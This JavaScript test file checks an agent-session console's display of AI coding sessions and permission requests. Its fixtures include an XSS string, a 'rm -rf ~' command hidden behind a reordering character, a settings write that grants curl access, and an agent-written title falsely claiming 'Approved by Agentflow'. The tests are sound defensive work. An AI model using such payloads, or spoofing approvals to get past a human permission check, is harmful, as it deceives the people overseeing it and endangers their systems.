"use strict";

(async () => {
  const byID = id => document.getElementById(id);
  function check(test, message) { if (!test) throw new Error(message); }
  async function until(test, message) {
    const end = Date.now() + 8000;
    while (!(await test())) {
      check(Date.now() < end,message);
      await new Promise(resolve => setTimeout(resolve,20));
    }
  }
  const pause = ms => new Promise(resolve => setTimeout(resolve,ms));
  const post = (path, body) => fetch("/fixture/stream/" + path,{method:"POST",body});
  const sent = async route => (await (await fetch("/fixture/ai/requests")).json()).filter(item => !route || item.route === route);
  const answer = (route, code) => fetch("/fixture/ai/status?route=" + route + "&code=" + code,{method:"POST"});
  const repo = "3f2a9c1b7d4e5f60";
  const at = ms => new Date(Date.now() + ms).toISOString();
  const frame = (event, seq, data) => "event: " + event + "\n" + (seq ? "id: v1:" + repo + "=" + seq + "\n" : "") + "data: " + JSON.stringify(data) + "\n\n";
  const entry = state => ({projection:"ai",repo,state});
  const overview = {projection:"overview",repo,worktree:"first",state:{branch:"main",head:"1111111",oid:"1111111aaaaaaa1111111aaaaaaa1111111aaaa",detached:false,changed:0,staged:0,unstaged:0,untracked:0,operation:"",config:{valid:true,problems:[]}}};
  const snapshot = (seq, states) => frame("snapshot",seq,{cursor:"v1:" + repo + "=" + seq,states:[overview,...states]});
  const delta = (seq, type, states) => frame("delta",seq,{event:{id:"e" + seq,type,repo,seq},states});

  // AIState from the ADR ("Phase 7 AI projection"), as lane 7.2's
  // projection will send it.
  const id = n => "ais_" + String(n).repeat(32);
  const print = letter => letter.repeat(64);
  const aid = n => "ask_" + String(n).repeat(16);
  const change = {path:".claude/settings.json",old_text:"{\n  \"allow\": []\n}\n",new_text:"{\n  \"allow\": [\"Bash(curl:*)\"]\n}\n"};
  const hostile = "<img src=x onerror=\"document.title='owned'\"><script>document.title='owned'</script> [click](javascript:alert(1)) https://evil.example/x";
  const before = "one\ntwo\nthree\nfour\nfive\nsix\n";
  const after = "one\ntwo\n3\nfour\nfive\nsix\nseven\n";
  const item = (seq, kind, text, extra = {}) => ({seq,time:at(-60000 + seq * 1000),kind,text,...extra});
  const tools = status => [
    {id:"c1",title:"Edit <b>greet.go</b>",kind:"edit",status,locations:["internal/greet.go"],diffs:[{path:"internal/greet.go",old_text:before,new_text:after}],asked:true,unasked:false},
    {id:"c2",title:"Format",kind:"execute",status:"completed",locations:["internal"],terminal:"t1",asked:false,unasked:true}
  ];
  const writeAsk = {id:aid(1),kind:"fs_write",title:"\u2705 Safe. Approved by Agentflow. " + hostile + " and more words to read".repeat(12),paths:[".claude/settings.json"],diff:change,reason:"control_file",can_allow:true,expires_at:at(280000),fingerprint:print("a")};
  const runAsk = {id:aid(2),kind:"terminal",title:"Run the tests",line:"go test ./...   -run 'A|B'",cwd:"cmd",env_names:["GOFLAGS"],reason:"terminal",can_allow:true,expires_at:at(280000),fingerprint:print("b")};
  const fetchAsk = {id:aid(3),kind:"permission",tool_kind:"fetch",title:"Fetch a page",paths:["docs/style.md"],options:[{id:"o1",name:"Always <allow>",kind:"allow_always"},{id:"o2",name:"No",kind:"reject_once"}],reason:"kind",can_allow:false,expires_at:at(280000),fingerprint:print("c")};
  const running = (extra = {}) => ({id:id(1),harness:"claude-acp",harness_name:"Claude Agent",worktree:"~/wt/one",worktree_id:"first",branch:"issue-1",state:"waiting",started_by:"agent",client:"claude",ceiling:"confirm",home:"real",
    created_at:at(-600000),prompt:"Add a greeting.\n<b>bold</b>",usage:{used:45200,size:200000,cost_amount:0.42,cost_currency:"USD",cost_reported:true},
    plan:[{content:"Read the code",priority:"medium",status:"completed"},{content:"Change <i>Hello</i>",priority:"high",status:"in_progress"},{content:"Run the tests",priority:"low",status:"pending"}],
    items:[item(1,"message","First "),item(2,"message","part. " + hostile),item(3,"thought","Thinking <u>hard</u>"),item(4,"plan",""),item(5,"tool","",{tool_call:"c1"}),item(6,"tool","",{tool_call:"c1"}),item(7,"tool","",{tool_call:"c2"}),
      item(8,"unasked","execute in internal"),item(9,"usage",""),item(10,"future_kind","something new")],
    truncated:false,tool_calls:tools("in_progress"),terminals:[{id:"t1",line:"gofmt -w internal",cwd:"",output:"formatted\n<b>x</b>\n",exit:0},{id:"t2",line:"git status",cwd:"",output:"",exit:null}],
    asks:[writeAsk,runAsk,fetchAsk],counters:{tool_calls:2,asks:3,allowed:1,denied:0,unasked:1},...extra});
  const finished = {id:id(2),harness:"gemini",harness_name:"Gemini CLI",worktree:"~/wt/two",worktree_id:"second",branch:"issue-2",state:"ended",code:"end_turn",started_by:"person",client:"cli",home:"real",
    created_at:at(-5400000),ended_at:at(-5000000),prompt:"Fix typos.",usage:{used:100,size:0,cost_reported:false},items:[item(1,"message","Done.")],truncated:true,tool_calls:[],changed_files:["docs/a.md","docs/<b>.md"],counters:{tool_calls:1}};
  const failed = {id:id(3),harness:"codex-acp",harness_name:"Codex CLI",worktree:"~/wt/two",state:"ended",code:"auth_required",started_by:"person",created_at:at(-90000000),ended_at:at(-89990000),prompt:"x",items:[],tool_calls:[],counters:{}};
  const state = (sessions, extra = {}) => ({sessions,running:1,max_running:2,...extra});

  const page = byID("page-ai");
  const rows = () => [...byID("ai-session-list").querySelectorAll(".ai-row")];
  const row = n => byID("ai-session-list").querySelector('.ai-row[data-session="' + id(n) + '"]');
  const cards = () => [...byID("ai-ask-list").children];
  const buttons = card => [...card.querySelectorAll(".ai-ask-actions button")];
  const button = (card, decision) => card.querySelector('.ai-ask-actions button[data-decision="' + decision + '"]');
  const armed = card => buttons(card).every(node => !node.hasAttribute("aria-disabled"));
  const streamItems = () => [...byID("ai-items").children];
  const said = () => byID("live-announcer").textContent;
  const label = () => byID("stream-label").textContent;
  const visible = node => getComputedStyle(node).display !== "none";
  const current = () => [...document.querySelectorAll(".rail nav a[aria-current=page]")].map(node => node.dataset.page).join();

  let result = "passed";
  try {
    // The reader is defensive: a missing or damaged state never throws.
    const A = AgentflowAI;
    check(A.aiState(null) === null && A.aiState("x") === null && A.aiState([]) === null,"a missing state is not read as none");
    const bare = A.aiState({});
    check(bare.sessions.length === 0 && bare.running === 0 && bare.maxRunning === 0,"an empty state is not read safely");
    const odd = A.aiState({running:-1,max_running:"2",sessions:[{id:id(1),state:"future",code:"<b>",started_by:"root",ceiling:"none",home:"moon",created_at:"never",usage:"lots",plan:"none",items:[{seq:2,kind:"message",text:7},{seq:1,kind:"message",text:"late"},null,{kind:"x"}],
      tool_calls:[{id:"a",kind:"wasm",status:"exploded",locations:"all",diffs:"x"},{id:"a"},null],terminals:[{id:"t",exit:"0"}],asks:[{id:aid(7),kind:"robot",can_allow:true,fingerprint:print("a")},{id:"bad id"},{id:"ask_1"},null],changed_files:"all",counters:"many"},
      {id:id(1)},{id:"ais_short"},{id:"../../etc"},{harness:"no id"},7]});
    const one = odd.sessions[0];
    check(odd.sessions.length === 1 && odd.running === 0 && odd.maxRunning === 0,"a damaged state is not read safely: " + JSON.stringify(odd).slice(0,400));
    check(one.state === "unknown" && one.code === "" && one.startedBy === "" && one.ceiling === "" && one.home === "" && one.created === 0 && one.usage === null && one.plan.length === 0 && one.items.length === 1 && one.items[0].text === ""
      && one.tools.length === 1 && one.tools[0].kind === "other" && one.tools[0].status === "pending" && one.terminals[0].exit === null && one.asks.length === 1 && one.asks[0].kind === "unknown" && one.asks[0].canAllow === false
      && one.changed.length === 0 && one.counters.tools === 0 && one.name === "Harness","a damaged session is not read safely: " + JSON.stringify(one).slice(0,600));
    // An ask is offered to allow only when the page can show all of it as it is.
    const ask = extra => A.aiState(state([running({asks:[{...runAsk,...extra}]})])).sessions[0].asks[0];
    check(ask({}).canAllow === true && ask({can_allow:false}).canAllow === false && ask({can_allow:"yes"}).canAllow === false && ask({fingerprint:""}).canAllow === false,"can_allow is not read strictly");
    check(ask({line:"echo hi \u202e; rm -rf ~"}).canAllow === false && ask({line:"a\nb"}).canAllow === false && ask({line:"x".repeat(20000)}).canAllow === false && ask({line:""}).canAllow === false
      && ask({cwd:"a\u0007b"}).canAllow === false && ask({env_names:["OK","B\u2066AD"]}).canAllow === false && ask({paths:["a","b\u001b[0m"]}).canAllow === false && ask({paths:Array(80).fill("p")}).canAllow === false,
      "a request the page cannot show in full can be allowed");
    check(!ask({line:"echo hi \u202e; rm -rf ~"}).line.includes("\u202e") && ask({line:"echo hi \u202e; rm -rf ~"}).line.includes("\ufffd"),"a reordering character is not made visible");
    check(A.aiState(state([{...finished,asks:[writeAsk]}])).sessions[0].asks.length === 0,"an ended session still asks");
    check(A.aiState(state([running()])).sessions[0].counters.tools === 2 && A.aiState(state([{...finished,counters:{ToolCalls:9}}])).sessions[0].counters.tools === 0,"the counters are not read by their JSON names");
    // A write can be allowed only with the whole change on the card.
    const writes = extra => A.aiState(state([running({asks:[{...writeAsk,...extra}]})])).sessions[0].asks[0];
    check(writes({}).canAllow === true && writes({}).blocked === "" && writes({diff:undefined}).blocked === "nodiff" && writes({diff:"x"}).blocked === "nodiff" && writes({diff:{...change,new_text:7}}).blocked === "nodiff"
      && writes({diff:{...change,cut:true}}).blocked === "large" && writes({reason:"preview_too_large"}).blocked === "large" && writes({diff:{...change,new_text:"x".repeat(80000)}}).blocked === "large"
      && writes({diff:{...change,new_text:Array.from({length:5000},(_, n) => "line " + n).join("\n")}}).blocked === "large"
      && writes({diff:{...change,new_text:"ok \u202e hidden"}}).blocked === "text" && writes({diff:{...change,old_text:"a\u200bb"}}).blocked === "text" && writes({diff:{...change,path:"other.json"}}).blocked === "values"
      && writes({paths:[".claude/settings.json","b"]}).blocked === "values" && writes({can_allow:false}).blocked === "option" && [writes({diff:undefined}),writes({can_allow:false}),writes({diff:{...change,cut:true}})].every(item => item.canAllow === false),
      "a write can be allowed without its whole change: " + JSON.stringify([writes({}).blocked,writes({diff:undefined}).blocked,writes({diff:{...change,cut:true}}).blocked,writes({diff:{...change,new_text:"ok \u202e hidden"}}).blocked]));
    check(writes({diff:{...change,old_text:undefined}}).canAllow === true && writes({diff:{...change,new_text:"tab\tand\nline"}}).canAllow === true,"a new file or a tab stops a write from being allowed");
    // Invisible characters and spaces that are not the plain space are unsafe; other letters are allowed.
    for (const [name, char] of [["no-break space","\u00a0"],["zero-width space","\u200b"],["zero-width joiner","\u200d"],["word joiner","\u2060"],["soft hyphen","\u00ad"],["byte order mark","\ufeff"],["ideographic space","\u3000"],
      ["thin space","\u2009"],["hangul filler","\u3164"],["variation selector","\ufe0f"],["tag character","\u{e0041}"],["private use","\ue000"],["line separator","\u2028"]]) {
      check(ask({line:"echo a" + char + "b"}).canAllow === false && ask({cwd:"a" + char + "b"}).canAllow === false && writes({paths:["a" + char + "b"],diff:{...change,path:"a" + char + "b"}}).canAllow === false
        && ask({env_names:["A" + char]}).canAllow === false,"a request with a " + name + " can be allowed");
      check(!ask({line:"echo a" + char + "b"}).line.includes(char) && ask({line:"echo a" + char + "b"}).line.includes("\ufffd"),"a " + name + " is not made visible");
    }
    check(ask({line:"echo caf\u00e9 \u0441rc"}).canAllow === true && writes({paths:["sr\u0441/a.go"],diff:{...change,path:"sr\u0441/a.go"}}).canAllow === true,"a letter outside ASCII stops a request from being allowed");
    check(writes({}).title.startsWith("[emoji] Safe.") && !/\p{Extended_Pictographic}/u.test(writes({title:"ok \u{1f512}\ufe0f \u26a0 done"}).title),"an emoji in the agent's words is not written out");
    check(A.stateView({state:"ended",code:"end_turn"}).label === "Finished" && A.stateView({state:"ended",code:"host_lost"}).tone === "bad" && A.stateView({state:"ended",code:"new_code"}).detail.includes("new_code")
      && A.stateView({state:"waiting",code:""}).label === "Waiting for you" && A.stateView({state:"creating",code:""}).label === "Starting" && A.stateView({state:"unknown",code:""}).label === "Unknown state","the session states are not told apart");
    check(A.askHeading({kind:"fs_write"}) === "Write a file" && A.askHeading({kind:"terminal"}) === "Run a command" && A.askHeading({kind:"permission",toolKind:"edit"}) === "The agent asks to use one of its own tools"
      && A.askHeading({kind:"unknown"}) === "A request this console does not know" && A.reasonText("ceiling").includes("An agent started") && A.reasonText("new_reason") === "Reason code new_reason." && A.remaining(65000) === "1 min 05 s","the request texts are wrong");
    const diff = A.lineDiff(before.trimEnd(),after.trimEnd(),1);
    check(diff.map(line => line.op + line.text).join("|") === "…1 unchanged line not shown| two|-three|+3| four| five| six|+seven","the line diff is wrong: " + diff.map(line => line.op + line.text).join("|"));
    check(A.lineDiff("","a\nb").map(line => line.op).join("") === "++" && A.lineDiff("a","a").every(line => line.op === " ") && A.lineDiff(Array(900).fill("x").join("\n"),"").length === 601,"the line diff does not handle a new file, no change or a long change");

    await until(() => !byID("connection-options").hidden,"the console did not ask for a session");
    const ticket = await (await fetch("/fixture/ticket",{method:"POST"})).text();
    location.hash = new URLSearchParams({launch:ticket,screen:"overview"}).toString();
    await until(() => !byID("console-shell").hidden && !byID("page-overview").hidden,"the overview did not open");
    check(page.hidden && current() === "overview","the AI sessions page shows before it is opened");

    // The rail entry opens the page; the other pages step aside.
    const navigation = document.querySelector('.rail nav a[data-page="ai"]');
    check(navigation && visible(navigation) && navigation.getAttribute("href") === "#ai" && navigation.textContent.trim() === "AI sessions" && byID("ai-nav-count").hidden,"the rail has no AI sessions entry");
    navigation.click();
    await until(() => !page.hidden && current() === "ai","the AI sessions page did not open");
    check(!visible(byID("page-overview")) && !visible(byID("page-harnesses")) && document.activeElement === byID("main"),"another page shows beside AI sessions, or focus did not move to the page");
    check(!byID("ai-wait").hidden && byID("ai-body").hidden && byID("ai-note").hidden,"the page does not show that it waits for the stream");
    const streams = await (await fetch("/fixture/stream/requests")).json();
    check(new URLSearchParams(streams[streams.length - 1].query).getAll("topic").includes("*/*/ai.session.**"),"the stream does not follow the session events");

    // A live stream without an ai state says so.
    await post("emit",snapshot(1,[]));
    await until(() => label() === "Live" && !byID("ai-note").hidden,"the page does not say that the stream has no session state");
    check(byID("ai-note").textContent.includes("no AI session state") && byID("ai-wait").hidden && byID("ai-body").hidden,"the missing state is not explained");

    // No session yet: the command to copy, and nothing that starts one.
    await post("emit",snapshot(2,[entry(state([],{running:0}))]));
    await until(() => !byID("ai-body").hidden,"the empty state did not show");
    check(byID("ai-layout").hidden && !byID("ai-start-lead").hidden && byID("ai-summary").hidden && page.querySelector(".ai-start .ai-command code").textContent === 'agentflow ai run --harness HARNESS "PROMPT"',"the empty state does not show the command to start a session");
    check(!said() && !page.querySelector(".live-changed"),"the first state was highlighted or announced");
    check(!page.querySelector("form, input, select, textarea") && ![...page.querySelectorAll("button")].some(node => /^(start|run)\b|new session/i.test(node.textContent)),"the page has a control that starts a session");

    // Sessions that arrive live are announced, the waiting requests first.
    await post("emit",snapshot(3,[entry(state([running(),finished,failed]))]));
    await until(() => rows().length === 3 && cards().length === 3,"the snapshot did not fill the page");
    await until(() => said().startsWith("Claude Agent asks for your permission: write a file. ") && said().endsWith("and 3 more changes."),"new sessions and requests are not announced: " + said());
    check(byID("ai-note").hidden && !byID("ai-layout").hidden && byID("ai-start-lead").hidden,"the sessions do not replace the empty state");
    check(byID("ai-summary").textContent === "3 sessions · 1 running · 3 requests wait for your answer. You are running 1 of at most 2 sessions on this computer.","the summary is wrong: " + byID("ai-summary").textContent);
    check(byID("ai-nav-count").textContent === "3" && !byID("ai-nav-count").hidden && byID("ai-nav-label").textContent === ", 3 requests wait for your answer","the rail does not count the waiting requests");

    // The list: harness, state with its code, who started it, when, branch and worktree.
    const first = row(1);
    check(first.getAttribute("aria-current") === "true" && !row(2).hasAttribute("aria-current") && first.querySelector(".ai-row-name").textContent === "Claude Agent" && first.querySelector(".ai-state-text").textContent === "Waiting for you"
      && first.querySelector(".ai-state").dataset.tone === "warn" && first.querySelector(".ai-row-start").textContent.startsWith("Started by an agent at ") && first.querySelector(".ai-row-branch").textContent === "issue-1"
      && first.querySelector(".ai-row-path").textContent === "~/wt/one" && first.querySelector(".ai-row-asks").textContent === "3 requests wait for your answer","the first row is wrong: " + first.textContent);
    check(row(2).querySelector(".ai-state-text").textContent === "Finished" && row(2).querySelector(".ai-state").dataset.tone === "ok" && row(3).querySelector(".ai-state-text").textContent === "Failed" && row(3).querySelector(".ai-state").dataset.tone === "bad"
      && row(2).querySelector(".ai-row-start").textContent.startsWith("Started by you at ") && row(3).querySelector(".ai-row-branch").hidden && row(2).querySelector(".ai-row-asks").hidden,"the other rows are wrong");

    // The selected session: the one that waits for an answer.
    check(byID("ai-session-name").textContent === "Claude Agent" && byID("ai-session-state").textContent === "Waiting for you" && byID("ai-session-detail").textContent.includes("waits for an answer"),"the selected session's head is wrong");
    const facts = byID("ai-session-facts").textContent;
    check(facts.includes("An agent (claude)") && facts.includes("Everything except reading inside the worktree asks you first") && facts.includes("~/wt/one") && facts.includes("issue-1")
      && byID("ai-session-details").textContent.includes(id(1)) && byID("ai-session-details").textContent.includes("Claude Agent (claude-acp)") && byID("ai-session-details").textContent.includes("uses your sign-in"),"the session facts are wrong: " + facts);
    check(byID("ai-prompt-body").textContent === "Add a greeting.\n<b>bold</b>" && byID("ai-plan-count").textContent === "1 of 3 done" && byID("ai-plan-list").children.length === 3
      && byID("ai-plan-list").children[1].textContent === "In progressChange <i>Hello</i>High priority" && byID("ai-plan-list").children[1].dataset.state === "in_progress","the prompt or the plan is wrong: " + byID("ai-plan-list").textContent);
    const totals = byID("ai-totals").textContent;
    check(totals.includes("45,200 of 200,000 tokens") && totals.includes("0.42 USD, reported by the harness. Agentflow does not check it.") && totals.includes("3 asked you · 1 allowed · 0 rejected") && totals.includes("1 tool call ran without asking you."),"the totals are wrong: " + totals);
    check(byID("ai-changed").hidden && !byID("ai-cancel").hidden && !byID("ai-cancel-open").hidden && byID("ai-cancel-confirm").hidden,"a running session shows changed files, or no Cancel");

    // Permission cards: what Agentflow resolved, the agent's words apart from it, and only Reject and Allow once.
    const [write, run, web] = cards();
    check(byID("ai-asks-title").textContent === "3 requests wait for your answer" && write.querySelector(".ai-ask-title").textContent === "Write a file" && run.querySelector(".ai-ask-title").textContent === "Run a command"
      && web.querySelector(".ai-ask-title").textContent === "The agent asks to use one of its own tools","the card headings are wrong");
    const resolved = card => card.querySelector(".ai-ask-resolved").textContent;
    check(resolved(write).startsWith("What Agentflow checked") && resolved(write).includes(".claude/settings.json") && resolved(write).includes("~/wt/one") && resolved(write).includes("controls an agent") && resolved(write).includes("Agentflow writes this file itself"),"the write card does not show what Agentflow resolved: " + resolved(write));
    // A write shows the change itself, in a box that scrolls and takes focus.
    const shownChange = write.querySelector(".ai-ask-resolved .ai-ask-diff");
    const changed = [...shownChange.querySelectorAll(".ai-diff-row")].map(node => node.dataset.op + ":" + node.textContent).join("|");
    check(changed === "same:\u00a0{|remove:-  \"allow\": []|add:+  \"allow\": [\"Bash(curl:*)\"]|same:\u00a0}" && write.querySelector(".ai-ask-count").textContent === "1 line put in, 1 line taken out." && shownChange.tabIndex === 0
      && getComputedStyle(shownChange).overflowY === "auto" && parseFloat(getComputedStyle(shownChange).maxHeight) > 0 && !write.querySelector(".ai-ask-fixed"),"the write card does not show the change: " + changed);
    const exact = [...run.querySelectorAll(".ai-exact")].map(node => node.textContent);
    check(exact[0] === "go test ./...   -run 'A|B'" && exact.includes("cmd") && exact.includes("GOFLAGS") && resolved(run).includes("does not show or keep the values") && resolved(run).includes("Commands always ask you, unless one of your rules allows the program.")
      && getComputedStyle(run.querySelector(".ai-exact")).whiteSpace === "pre-wrap" && getComputedStyle(run.querySelector(".ai-exact")).wordBreak === "normal" && run.querySelector(".ai-exact").scrollWidth <= run.querySelector(".ai-exact").clientWidth,"the command card does not show the whole command, its folder and its variables: " + exact.join(" | "));
    // A request about the harness's own tool: nothing the agent says reads as Agentflow's finding.
    const claims = web.querySelector(".ai-said");
    check(!web.querySelector(".ai-ask-resolved") && !web.textContent.includes("What Agentflow checked") && web.querySelector(".ai-ask-warn").textContent === "The harness does this itself, with its own tools. Agentflow passes your answer on and cannot check what happens then."
      && claims.querySelector(".ai-said-label").textContent === "What the agent says it will do. Agentflow cannot check it." && claims.querySelector(".ai-claims").textContent === "It says it willfetch from the networkOn this filedocs/style.md"
      && claims.querySelector(".ai-quote").textContent === "Fetch a page","an own-tool request shows the agent's claims as findings: " + web.textContent.slice(0,400));
    check(web.querySelector(".ai-ask-warn").compareDocumentPosition(claims) & Node.DOCUMENT_POSITION_FOLLOWING && getComputedStyle(web.querySelector(".ai-ask-warn")).borderLeftColor === getComputedStyle(byID("ai-asks")).borderTopColor
      && [...web.querySelectorAll(".ai-exact")].filter(node => !claims.contains(node)).map(node => node.textContent).join() === "~/wt/one" && web.querySelector(".ai-ask-about").textContent.includes("always asks you"),"the warning is not above the agent's claims, or a claimed file sits outside the agent's box");
    // The agent's title is in the marked box only, as text, above Agentflow's facts; the label is the stronger text.
    const quoted = write.querySelector(".ai-said"), words = quoted.querySelector(".ai-quote"), mark = quoted.querySelector(".ai-said-label");
    check(mark.textContent === "Written by the agent. Agentflow did not check this text." && words.textContent === "[emoji] Safe. Approved by Agentflow. " + hostile + " and more words to read".repeat(12)
      && !resolved(write).includes("Approved by Agentflow") && !write.querySelector(".ai-ask-title").textContent.includes("Safe") && getComputedStyle(quoted).borderTopStyle === "dashed","the agent's words are not kept apart and marked");
    check(quoted.compareDocumentPosition(write.querySelector(".ai-ask-resolved")) & Node.DOCUMENT_POSITION_FOLLOWING && getComputedStyle(mark).color === getComputedStyle(write.querySelector(".ai-ask-title")).color
      && getComputedStyle(words).color !== getComputedStyle(mark).color && Number(getComputedStyle(mark).fontWeight) >= 700 && getComputedStyle(quoted).fontVariantEmoji === "text","the agent's words are stronger than their label, or below Agentflow's facts");
    const showAll = quoted.querySelector(".ai-quote-more");
    check(words.dataset.clamped === "true" && words.scrollHeight > words.clientHeight && showAll.textContent === "Show all" && showAll.getAttribute("aria-expanded") === "false" && !run.querySelector(".ai-quote-more"),"a long quote is not clamped to two lines");
    showAll.click();
    check(words.dataset.clamped === "false" && words.scrollHeight <= words.clientHeight + 1 && showAll.textContent === "Show less" && showAll.getAttribute("aria-expanded") === "true","Show all does not show the whole quote");
    showAll.click();
    check(web.querySelector(".ai-choices").textContent === "Always <allow> (allow always)No (reject once)" && web.querySelector(".ai-said").textContent.includes("Agentflow answers only with"),"the agent's option names are not shown as its own words");
    for (const card of [write, run]) check(buttons(card).map(node => node.textContent).join() === "Reject,Allow once","a card has other buttons than Reject and Allow once: " + buttons(card).map(node => node.textContent).join());
    check(buttons(web).map(node => node.textContent).join() === "Reject" && web.querySelector(".ai-ask-fixed").textContent.includes("offered no “allow once” choice"),"Allow once shows for a request that cannot be allowed");
    // The two buttons have the same weight and short names; the heading and the status line describe them.
    const yes = button(write,"allow"), no = button(write,"reject");
    check(yes.className === no.className && getComputedStyle(yes).backgroundColor === getComputedStyle(no).backgroundColor && getComputedStyle(yes).fontWeight === getComputedStyle(no).fontWeight && !yes.hasAttribute("aria-label")
      && yes.getAttribute("aria-describedby") === write.querySelector(".ai-ask-title").id + " " + write.querySelector('[data-part="status"]').id,"Allow once outweighs Reject, or has a long name");
    check(write.querySelector('[data-part="time"]').textContent.startsWith("Answer within 4 min ") && write.querySelector('[data-part="time"]').textContent.endsWith("After that, Agentflow rejects it."),"the card does not show the time left: " + write.querySelector('[data-part="time"]').textContent);
    // Reject and Allow once sit apart, and nothing has focus on them.
    const gap = yes.getBoundingClientRect().left - no.getBoundingClientRect().right;
    check(gap >= 32 && !write.contains(document.activeElement),"Reject and Allow once touch, or a button took focus: gap " + gap);

    // Agent text is text: no element, no link, no image, no script ran.
    check(!page.querySelector("#ai-session img, #ai-session script, #ai-session iframe, #ai-session b, #ai-session i, #ai-session u, #ai-session a") && document.title !== "owned","agent text became markup");
    check(!performance.getEntriesByType("resource").some(item => item.name.includes("evil.example")),"the page loaded an address from agent text");

    // A new card's buttons wait a moment: a click then sends nothing.
    check(!armed(write) && button(write,"allow").tabIndex === 0,"a new card's buttons work at once, or left the tab order");
    button(write,"allow").click();
    await pause(100);
    check((await sent()).length === 0 && said().includes("just appeared or moved"),"a click on a card that just appeared was sent");
    await until(() => armed(write) && armed(run),"the buttons never start to work");

    // The stream: pieces of a message are one text, a thought is closed, one card per tool call.
    const blocks = streamItems();
    check(blocks.map(node => node.dataset.kind).join() === "message,thought,plan,tool,tool,unasked,unknown","the stream's blocks are wrong: " + blocks.map(node => node.dataset.kind).join());
    check(blocks[0].textContent === "First part. " + hostile && getComputedStyle(blocks[0].querySelector(".ai-message")).whiteSpace === "pre-wrap","message pieces are not one plain text");
    check(!blocks[1].querySelector("details").open && blocks[1].querySelector("summary").textContent === "Thought" && blocks[1].querySelector(".ai-thought").textContent === "Thinking <u>hard</u>","a thought is not collapsed");
    const edit = blocks[3], format = blocks[4];
    check(edit.querySelector(".ai-kind").textContent === "Edit" && edit.querySelector(".ai-state-text").textContent === "Running" && edit.textContent.includes("The agent's description: Edit <b>greet.go</b>") && edit.textContent.includes("Asked first")
      && edit.querySelector(".ai-paths").textContent === "internal/greet.go","the tool call card is wrong: " + edit.textContent);
    check(format.dataset.tone === "warn" && format.querySelector(".ai-unasked").textContent === "Ran without asking" && format.querySelector(".ai-warn").textContent.includes("Agentflow could not stop it") && format.querySelector(".ai-exact").textContent === "gofmt -w internal"
      && format.textContent.includes("Exit code 0"),"a tool call that ran without asking is not marked: " + format.textContent);
    check(blocks[5].dataset.tone === "warn" && blocks[5].textContent === "Ran without asking execute in internal" && blocks[6].textContent === "Update something new","the other items are wrong");
    // A diff and an output are built when opened.
    const changes = edit.querySelector("details");
    check(changes.querySelector("summary").textContent === "Changes to internal/greet.go" && !changes.querySelector(".ai-diff"),"a closed diff is already built");
    changes.querySelector("summary").click();
    await until(() => changes.querySelector(".ai-diff"),"the diff did not open");
    const lines = [...changes.querySelectorAll(".ai-diff-row")].map(node => node.dataset.op + ":" + node.textContent);
    check(lines.join("|") === "same:\u00a0one|same:\u00a0two|remove:-three|add:+3|same:\u00a0four|same:\u00a0five|same:\u00a0six|add:+seven" && changes.querySelector(".ai-diff").tabIndex === 0,"the diff is wrong: " + lines.join("|"));
    format.querySelector("details summary").click();
    await until(() => format.querySelector(".ai-output"),"the output did not open");
    check(format.querySelector(".ai-output").textContent === "formatted\n<b>x</b>\n","terminal output is not plain text");
    // A command no tool call shows has its own list.
    check(!byID("ai-commands").hidden && byID("ai-command-list").children.length === 1 && byID("ai-command-list").textContent.includes("git status") && byID("ai-command-list").textContent.includes("Still running"),"a command without a tool call is not listed");

    // A live update changes the stream in place: old blocks stay, the tool card keeps what was opened.
    const more = [...running().items,item(11,"message","Next "),item(12,"message","text.")];
    await post("emit",delta(4,"ai.session.output",[entry(state([running({items:more,tool_calls:tools("completed")}),finished,failed]))]));
    await until(() => streamItems().length === 8,"the new output did not arrive");
    check(streamItems()[0] === blocks[0] && streamItems()[3] === edit && edit.querySelector(".ai-state-text").textContent === "Done" && edit.querySelector("details").open && edit.querySelector(".ai-diff")
      && streamItems()[7].textContent === "Next text." && cards()[0] === write && armed(write),"an update rebuilt the stream, closed a diff or moved a card");
    await post("emit",delta(5,"ai.session.output",[entry(state([running({items:[...more,item(13,"message"," And more.")],tool_calls:tools("completed")}),finished,failed]))]));
    await until(() => streamItems()[7].textContent === "Next text. And more.","a new piece did not join its message");

    // The reader opened a diff, so the stream stayed where it was and offers the newest output.
    check(!byID("ai-latest").hidden && byID("ai-latest").textContent === "Show the latest (1 new update)","new output moved the reader away from an open diff: " + byID("ai-latest").textContent);
    byID("ai-latest").click();
    // A long session stays quick, follows the newest output, and stops following when the reader scrolls up.
    const long = [];
    for (let n = 1; n <= 200; n++) long.push(item(100 + n,n % 2 ? "message" : "info","line " + n + " " + "word ".repeat(40)));
    await post("emit",delta(6,"ai.session.output",[entry(state([running({items:long,tool_calls:[]}),finished,failed]))]));
    await until(() => streamItems().length === 200,"a long stream did not show");
    const box = byID("ai-stream");
    check(box.scrollHeight > box.clientHeight && box.scrollHeight - box.scrollTop - box.clientHeight < 24 && byID("ai-latest").hidden,"the stream does not follow the newest output: " + [box.scrollHeight,box.scrollTop,box.clientHeight,byID("ai-latest").hidden].join());
    const started = performance.now();
    for (let n = 1; n <= 20; n++) {
      long.push(item(400 + 2 * n,"message","more " + n));
      long.push(item(401 + 2 * n,"info","note " + n));
      await post("emit",delta(6 + n,"ai.session.output",[entry(state([running({items:long.slice(-200),tool_calls:[]}),finished,failed]))]));
    }
    await until(() => streamItems()[199]?.textContent === "Note note 20","twenty updates of a long stream did not arrive");
    check(performance.now() - started < 4000 && box.scrollHeight - box.scrollTop - box.clientHeight < 24,"a long stream is slow or lost its place: " + Math.round(performance.now() - started) + " ms");
    box.scrollTop = 0;
    await pause(60);
    long.push(item(600,"message","unseen"));
    await post("emit",delta(27,"ai.session.output",[entry(state([running({items:long.slice(-200),tool_calls:[]}),finished,failed]))]));
    await until(() => !byID("ai-latest").hidden,"new output below is not offered");
    check(box.scrollTop === 0 && byID("ai-latest").textContent === "Show the latest (1 new update)","the stream moved under the reader: " + byID("ai-latest").textContent);
    byID("ai-latest").click();
    check(box.scrollHeight - box.scrollTop - box.clientHeight < 24 && byID("ai-latest").hidden && document.activeElement === box,"Show the latest did not go to the end");

    // Allow once: one request with the session, the ask, the decision and the fingerprint.
    button(write,"allow").click();
    await until(async () => (await sent("respond")).length === 1,"Allow once was not sent");
    let request = (await sent("respond"))[0];
    check(request.body === JSON.stringify({session:id(1),ask:aid(1),decision:"allow",fingerprint:print("a")}) && request.content_type === "application/json" && request.console === "console" && request.origin === location.origin,"the allow request is wrong: " + JSON.stringify(request));
    await until(() => write.querySelector('[data-part="status"]').textContent === "Allow once sent. Waiting for the session to confirm.","the card does not say that the answer was sent");
    check(!armed(write) && armed(run),"the answered card can be answered again at once, or another card stopped working");
    button(write,"allow").click();
    button(write,"reject").click();
    await pause(100);
